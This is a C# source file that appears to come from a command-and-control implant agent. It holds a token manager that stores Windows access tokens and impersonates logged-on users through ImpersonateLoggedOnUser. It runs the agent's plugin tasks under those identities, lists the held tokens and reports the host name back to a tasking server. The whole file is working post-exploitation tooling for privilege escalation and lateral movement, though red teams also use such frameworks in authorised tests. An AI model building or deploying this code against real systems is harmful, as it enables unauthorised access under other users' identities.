using Microsoft.Win32.SafeHandles;
using System.Text.Json;
using System.Security.Principal;
using Agent.Models;
using Agent.Interfaces;
using Agent.Utilities;

namespace Agent.Managers
{
    public class TokenManager : ITokenManager
    {
        static Dictionary<int, SafeAccessTokenHandle> tokens = new Dictionary<int, SafeAccessTokenHandle>();
        private ILogger logger { get; set; }
        public TokenManager(ILogger logger)
        {
            this.logger = logger;
        }

        public bool Impersonate(int i) =>
            tokens.TryGetValue(i, out SafeAccessTokenHandle? token) && Native.ImpersonateLoggedOnUser(token);

        public void RunTaskImpersonated(IPlugin plug, ServerJob job)
        {
            _ = WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), async () =>
            {
                await plug.Execute(job);
            });
        }

        public Task HandleFilePluginImpersonated(IFilePlugin plug, ServerJob job, ServerTaskingResponse response)
        {
            return WindowsIdentity.RunImpersonated(
                this.GetImpersonationContext(job.task.token),
                () => plug.HandleNextMessage(response));
        }

        public void HandleInteractivePluginImpersonated(IInteractivePlugin plug, ServerJob job, InteractMessage message)
        {
            WindowsIdentity.RunImpersonated(this.GetImpersonationContext(job.task.token), () =>
            {
                plug.Interact(message);
            });
        }

        public string List(ServerJob job)
        {
            Dictionary<string, string> toks = tokens.ToDictionary(
                token => token.Key.ToString(),
                token => token.Value.DangerousGetHandle().ToString());

            return new TaskResponse()
            {
                completed = true,
                user_output = JsonSerializer.Serialize(toks),
                task_id = job.task.id,
            }.ToJson();
        }

        public bool Revert() => Native.RevertToSelf();

        public int getIntegrity()
        {
            using var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator) ? 3 : 2;
        }

        public TokenTaskResponse AddToken(SafeAccessTokenHandle hToken, CreateToken tokenOptions, string task_id)
        {
            string[] split = tokenOptions.username.Split('@');
            Token token = new Token()
            {
                action = "add",
                Handle = hToken.DangerousGetHandle().ToInt64(),
                description = tokenOptions.name,
                token_id = tokens.Count + 1,
                user = split.Length > 1
                    ? $"{split[1]}\\{split[0]}"
                    : $"{tokenOptions.domain}\\{tokenOptions.username}",
            };

            tokens.Add(token.token_id, hToken);

            return new TokenTaskResponse()
            {
                completed = true,
                user_output = "Created.",
                task_id = task_id,
                tokens = new List<Token>() { token },
                callback_tokens = new List<CallbackToken>
                {
                    new CallbackToken()
                    {
                        action = "add",
                        host = System.Net.Dns.GetHostName(),
                        token_id = token.token_id,
                    }
                }
            };
        }

        public SafeAccessTokenHandle GetImpersonationContext(int id) => tokens[id];
    }
}
